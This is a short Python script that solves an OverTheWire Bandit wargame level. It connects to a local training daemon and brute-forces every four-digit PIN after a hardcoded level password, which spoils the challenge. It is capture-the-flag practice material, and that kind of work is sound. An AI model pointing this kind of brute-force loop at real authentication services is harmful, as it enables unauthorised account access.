#!/bin/python
"""
Pin cracker written in Python for the OverTheWire Bandit challenge level 25
http://overthewire.org/wargames/bandit/bandit25.html
"""

# Import library and define constants

import socket

PW = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ "
HOST = "localhost"
PORT = 30002

# Establish connection

s = socket.socket()
s.connect((HOST, PORT))
s.recv(1024)

# Send all PINs between 0001 and 9999

for n in range(1,10000):
	pin = str(n).zfill(4)
	s.sendall(PW + str(pin) + '\n')
	reply = s.recv(1024)
	print("Trying PIN " + str(pin) + "...")
	print(reply)
	if reply[:5] != "Wrong":
		break